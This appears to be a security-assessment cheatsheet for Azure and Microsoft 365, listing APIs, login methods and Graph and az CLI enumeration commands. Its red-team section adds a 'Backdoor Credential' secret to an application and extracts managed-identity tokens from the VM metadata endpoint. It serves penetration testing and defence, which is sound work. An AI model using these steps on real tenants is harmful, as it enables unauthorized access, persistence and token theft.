---
title: Azure
description: Azure & Microsoft 365 Security Assessment Cheatsheet
icon: material/microsoft-azure # simple/portainer , octicons/mark-github-16 , material/account-convert , lucide/atom
# status: new # deprecated
comments: true
# hide:
#     - navigation
#     - toc
#     - feedback
#     - tags
---

## Azure & Microsoft 365 Security Assessment Cheatsheet

A comprehensive guide for security professionals conducting assessments in Azure and Microsoft 365 environments

### Core Azure/M365 Components

#### **Azure Resource Manager (ARM)**

- _Management layer for Azure resources_
- _Controls resource provisioning, access control, and management_

!!! info

    Azure Resource Manager API:

    ```bash
    # Management API for Azure resources
    {HTTP_METHOD} https://management.azure.com/{version}/{resource}?{query-parameters}

    # Examples:
    GET https://management.azure.com/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01
    ```

#### **Microsoft 365/Office 365**

- _Productivity suite including Exchange, SharePoint, Teams_
- _Combines Office apps with cloud services_

!!! info

    Office 365 Management API

    ```bash
    # Office-specific management APIs
    {HTTP_METHOD} https://{service}.office.com/{version}/{resource}?{query-parameters}

    # Examples (Exchange Online):
    GET https://outlook.office.com/api/v2.0/me/messages
    ```

#### **Azure AD (Now Entra ID)**

- _Identity and access management service_
- _Handles authentication, authorization, and user management_

!!! info

    ```bash
    # Unified API for Microsoft cloud services
    {HTTP_METHOD} https://graph.microsoft.com/{version}/{resource}?{query-parameters}

    # Examples:
    GET https://graph.microsoft.com/v1.0/users
    GET https://graph.microsoft.com/v1.0/me/messages
    ```

### Authentication Methods


#### Long-Term Credentials

- **Graphical Interface (GUI)**
    - Azure AD Username & Password
    - Single Sign-On (SSO) Credentials (Username & Password)
- **Programmatic Access**
    - Username & Password
    - Client ID & Client Secre
    - Client Certificate Authentication

#### Short-Term Credentials

- **Programmatic Access**
    - OAuth Access Tokens (JWT)
    - Managed Identity Tokens
    - Refresh Tokens


### Portal Access Points

|Service|Portal URL|Purpose|
|---|---|---|
|**Azure Portal**|`https://portal.azure.com`|Azure resource management|
|**M365 Admin Center**|`https://admin.microsoft.com`|Tenant administration|
|**Office User Portal**|`https://office.com`|User productivity apps|



### Programmatic Authentication Methods

#### Azure CLI (`az`) Authentication

```bash
# Interactive login (username/password)
az login

# Service Principal with secret
az login --service-principal -u $APP_ID -p $CLIENT_SECRET --tenant $TENANT_ID

# Service Principal with certificate (more secure)
az login --service-principal -u $APP_ID -p ~/mycert.pem --tenant $TENANT_ID

# List available subscriptions
az account list --output table
```

#### Azure PowerShell Authentication

```bash
# Interactive login
Connect-AzAccount

# Service Principal with secret
$secureSecret = ConvertTo-SecureString $CLIENT_SECRET -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($APP_ID, $secureSecret)
Connect-AzAccount -ServicePrincipal -Tenant $TENANT_ID -Credential $credential

# Access token authentication
$token = (Get-AzAccessToken -ResourceUrl "https://management.azure.com").Token
Connect-AzAccount -AccessToken $token -AccountId $SUBSCRIPTION_ID
```

#### Microsoft Graph PowerShell

```bash
# Interactive login with specified scopes
Connect-MgGraph -Scopes "Directory.Read.All", "User.Read.All"

# With access token
Connect-MgGraph -AccessToken $ACCESS_TOKEN

# Check current connection
Get-MgContext
```

## CLI-Based Enumeration

### Programmatic Authentication Methods

#### Azure CLI (`az`) Authentication

```bash
# Interactive login (username/password)
az login

# Service Principal with secret
az login --service-principal -u $APP_ID -p $CLIENT_SECRET --tenant $TENANT_ID

# Service Principal with certificate (more secure)
az login --service-principal -u $APP_ID -p ~/mycert.pem --tenant $TENANT_ID

# List available subscriptions
az account list --output table
```

#### Azure PowerShell Authentication

```bash
# Interactive login
Connect-AzAccount

# Service Principal with secret
$secureSecret = ConvertTo-SecureString $CLIENT_SECRET -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($APP_ID, $secureSecret)
Connect-AzAccount -ServicePrincipal -Tenant $TENANT_ID -Credential $credential

# Access token authentication
$token = (Get-AzAccessToken -ResourceUrl "https://management.azure.com").Token
Connect-AzAccount -AccessToken $token -AccountId $SUBSCRIPTION_ID
```

#### Microsoft Graph PowerShell

```bash
# Interactive login with specified scopes
Connect-MgGraph -Scopes "Directory.Read.All", "User.Read.All"

# With access token
Connect-MgGraph -AccessToken $ACCESS_TOKEN

# Check current connection
Get-MgContext
```



### Initial Reconnaissance

#### Identity Provider Discovery

```bash
# Check if organization uses Azure AD as identity provider
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@domain.com&xml=1"

# Interpretation:
# - "Managed" = Pure Azure AD tenant
# - "Federated" = Uses external IdP (Okta, ADFS, etc.)
```

### Entra ID (Azure AD) Enumeration

#### Session Information

```bash
# Connect with necessary permissions
Connect-MgGraph -Scopes "Directory.Read.All", "User.Read.All", "Group.Read.All"

# Verify current session
Get-MgContext
```

#### Directory Roles

```bash
# List all directory roles
Get-MgDirectoryRole | Select-Object DisplayName, Id | Format-Table

# Get members of specific role
Get-MgDirectoryRoleMember -DirectoryRoleId "role-id" -All | 
    Select-Object DisplayName, UserPrincipalName, Id
```
#### User Enumeration

```bash
# Get all users with basic properties
Get-MgUser -All | 
    Select-Object DisplayName, UserPrincipalName, Id, AccountEnabled

# Get user's group memberships
Get-MgUserMemberOf -UserId "user-id" | 
    Select-Object DisplayName, Description
```

#### Group Enumeration

```bash
# List all groups
Get-MgGroup -All | 
    Select-Object DisplayName, Id, GroupTypes, MailEnabled, SecurityEnabled

# Get group members
Get-MgGroupMember -GroupId "group-id" -All | 
    Select-Object DisplayName, UserPrincipalName, Id
```

#### Application & Service Principal Enumeration

```bash
# List all applications
Get-MgApplication -All | 
    Select-Object DisplayName, AppId, Id, PublisherDomain

# Get application details
Get-MgApplication -ApplicationId "app-object-id" | 
    Select-Object * | Format-List

# Get application owners
Get-MgApplicationOwner -ApplicationId "app-object-id" | 
    Select-Object DisplayName, UserPrincipalName

# Check application permissions
$app = Get-MgApplication -ApplicationId "app-object-id"
$app.RequiredResourceAccess | Format-List
```

### Azure Resource Manager Enumeration

#### Subscription Information

```bash
# Show current subscription
az account show --output table

# List all accessible subscriptions
az account list --all --output table

# Set specific subscription
az account set --subscription "subscription-id"
```

#### Resource Groups

```bash
# List resource groups in current subscription
az group list --output table

# List resource groups in specific subscription
az group list --subscription "sub-id" --output table
```

#### Resource Enumeration

```bash
# List all resources in subscription
az resource list --output table

# List resources in specific resource group
az resource list --resource-group "RG-NAME" --output table

# Get specific resource details
az resource show --name "resource-name" --resource-group "RG-NAME" --resource-type "Microsoft.Compute/virtualMachines"
```

#### Role Assignment Analysis

```bash
# List all role assignments in subscription
az role assignment list --subscription "sub-id" --output table

# List all role assignments (including inherited)
az role assignment list --all --output table

# List assignments for specific principal
az role assignment list --assignee "user@domain.com" --all --output table
az role assignment list --assignee "service-principal-id" --all --output table
```

#### Role Definitions

```bash
# List all role definitions
az role definition list --output table

# Get specific role permissions
az role definition list --name "Owner" --output json

# List custom roles only
az role definition list --custom-role-only --output table
```

## Azure Cloud Red Team Operations

### Initial Access & Privilege Escalation

#### Authentication with Compromised Credentials

```bash
# Azure CLI login
az login

# Verify accessible subscriptions
az account list --output table

# Microsoft Graph PowerShell login
Connect-MgGraph -Scopes "Directory.Read.All", "User.ReadWrite.All"
```

#### Entra ID Privilege Escalation

**User Discovery & Object Ownership**

```bash
# Find specific user
Get-MgUser -Filter "startswith(displayName,'auditor')" | 
    Select-Object DisplayName, Id, UserPrincipalName

# List objects owned by user
Get-MgUserOwnedObject -UserId "user-id" | 
    Select-Object DisplayName, Id
```

**Application-Based Attacks**

```bash
# Find target application
Get-MgApplication -Filter "startswith(displayName,'prod-app')" | 
    Select-Object DisplayName, Id, AppId

# Check application ownership
Get-MgApplicationOwner -ApplicationId "app-object-id" | 
    Select-Object DisplayName, UserPrincipalName

# As application owner, add new credential
$passwordCredential = @{
    DisplayName = "Backdoor Credential"
    EndDateTime = Get-Date).AddYears(1)
}
Add-MgApplicationPassword -ApplicationId "app-object-id" -PasswordCredential $passwordCredential
```

**Service Principal Role Checking**

```bash
# Check if service principal has directory roles
Get-MgServicePrincipal -Filter "displayName eq 'service-principal-name'" | 
    Get-MgServicePrincipalMemberOf | 
    Select-Object DisplayName, Description
```

#### Azure Resource Manager Attacks

**Role Assignment Analysis**

```bash
# Check user's role assignments
az role assignment list --assignee 'user@domain.com' --all --output table

# Check for high-privilege roles across subscriptions
foreach ($sub in $(az account list --query "[].id" -o tsv)) {
    echo "Checking subscription: $sub"
    az role assignment list --subscription $sub --assignee 'user@domain.com' --all --output table
}
```

**Virtual Machine Enumeration & Exploitation**

```bash
# List VMs and their details
az vm list --show-details --output table

# Get VM IP addresses
az vm list-ip-addresses --name "vm-name" --resource-group "RG-NAME" --output table

# Check for managed identity on VM
az vm identity show --name "vm-name" --resource-group "RG-NAME"
```

**Managed Identity Token Extraction**

```bash
# From within a VM with managed identity:
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s

# Parse the access token from response
$token = (Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{Metadata="true"}).access_token
```

**Leveraging Managed Identity**

```bash
# Authenticate with managed identity token
Connect-AzAccount -AccessToken $token -AccountId "subscription-id"

# Check managed identity's permissions
Get-AzRoleAssignment -ObjectId "managed-identity-principal-id" | 
    Select-Object RoleDefinitionName, Scope
```




??? note "Some Good Youtube Tutorials"


    <iframe width="560" height="315" src="https://www.youtube.com/embed/SspgnQhp2iA" title="1. Intro to Azure Red Teaming" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


    <iframe width="560" height="315" src="https://www.youtube.com/embed/bYrSMDrQS0Y" title="2. Azure Cloud Authentication Methods" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


    <iframe width="560" height="315" src="https://www.youtube.com/embed/QqA5iedYHL0" title="3. Azure Cloud Core Services Enumeration" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


    <iframe width="560" height="315" src="https://www.youtube.com/embed/314l421mVyY" title="4.  Azure Cloud Red Team Operations" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>